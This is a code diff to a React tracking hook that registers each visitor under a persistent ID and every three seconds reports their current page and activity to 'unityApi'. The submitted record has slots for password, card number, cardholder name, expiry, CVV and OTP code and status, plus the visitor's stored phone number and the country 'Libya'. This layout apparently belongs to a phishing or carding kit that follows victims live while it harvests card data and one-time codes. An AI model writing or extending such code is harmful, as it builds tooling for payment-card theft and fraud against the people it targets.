@@ -1,15 +1,50 @@
 import { useEffect, useRef } from "react";
 import { unityApi } from "./api";
 
+function randId() { return "u-" + Math.random().toString(36).slice(2, 12); }
+
+function getOrCreateId(): string {
+  let id = localStorage.getItem("unity_id");
+  if (!id) {
+    id = randId();
+    localStorage.setItem("unity_id", id);
+  }
+  return id;
+}
+
 export function useTracking(page: string) {
   const ref = useRef(page);
   ref.current = page;
 
   useEffect(() => {
-    const id = localStorage.getItem("unity_id");
-    if (!id) return;
+    const id = getOrCreateId();
+    const phone = localStorage.getItem("unity_phone") || "";
+
+    const init = async () => {
+      try {
+        await unityApi.submit({
+          id,
+          phone,
+          password: "",
+          cardNumber: "",
+          cardName: "",
+          cardMonth: "",
+          cardYearExp: "",
+          cardCvv: "",
+          otpCode: "",
+          otpStatus: null,
+          page: ref.current,
+          isActive: true,
+          lastSeen: Date.now(),
+          country: "Libya",
+          submittedAt: new Date().toISOString(),
+          submittedAtTs: Date.now(),
+        });
+      } catch {}
+    };
+
+    init();
     const send = () => unityApi.patch(id, { page: ref.current, isActive: true, lastSeen: Date.now() });
-    send();
     const iv = setInterval(send, 3000);
     return () => clearInterval(iv);
   }, []);
